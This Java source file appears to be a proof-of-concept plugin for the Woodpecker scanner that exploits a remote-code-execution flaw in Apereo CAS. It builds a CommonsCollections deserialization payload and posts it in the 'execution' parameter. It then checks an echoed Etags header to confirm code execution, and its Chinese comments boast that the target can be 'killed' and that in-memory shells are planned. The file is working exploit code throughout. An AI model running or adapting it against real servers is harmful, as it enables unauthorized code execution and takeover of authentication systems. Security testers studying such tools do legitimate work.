package me.gv7.woodpecker.plugin.pocs;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.plugin.payloads.CasPayloadGenerate;
import net.dongliu.requests.Requests;

import java.util.*;

public class CasPoc implements IPoc {
    @Override
    public List<IArgs> createPocCustomArgs() {
        List<IArgs> args = new ArrayList<>();
        final IArgs gadge = CasRCE.callbacks.getPluginHelper().createArgs();
        gadge.setName("gadge");
        gadge.setDefaultValue("CommonsCollections4");
        gadge.setMastSetup(true);
        gadge.setDescription("cc链，默认用cc4就能打死");

        final IArgs shellType = CasRCE.callbacks.getPluginHelper().createArgs();
        shellType.setName("shell_type");
        shellType.setDefaultValue("ThreadTest");
        gadge.setMastSetup(true);
        gadge.setDescription("以后会添加spring的内存马");

        args.add(gadge);
        args.add(shellType);
        return args;
    }

    @Override
    public IScanResult doCheck(ITarget target, Map<String, String> args) {
        final IScanResult scanResult = CasRCE.pluginHelper.createScanResult();

        String httpAddress = CasCommonUtils.checkUrl(target.getAddress());
        String gadge = args.get("gadge");
        String command = args.get("shell_type");

        try {
            if(CasCommonUtils.basicCheckVuln(httpAddress)){
                String payload = CasCommonUtils.generate(gadge, command);
                Map<String,String> requestBody = new HashMap<>();
                requestBody.put("execution", payload);

                Map<String,String> requestHeaders = new HashMap<>();
                String key = UUID.randomUUID().toString();
                requestBody.put("Etags", key);
                String etags = Requests.post(httpAddress).body(requestBody).verify(false).headers(requestHeaders).send().getHeader("Etags");
                if (etags.equals(key)){
                    scanResult.setExists(true);
                    scanResult.setMsg("发现目标: "+httpAddress+" 肯定能打死\n");
                }
            }
        }catch (Exception ignore){
        }
        return scanResult;
    }
}
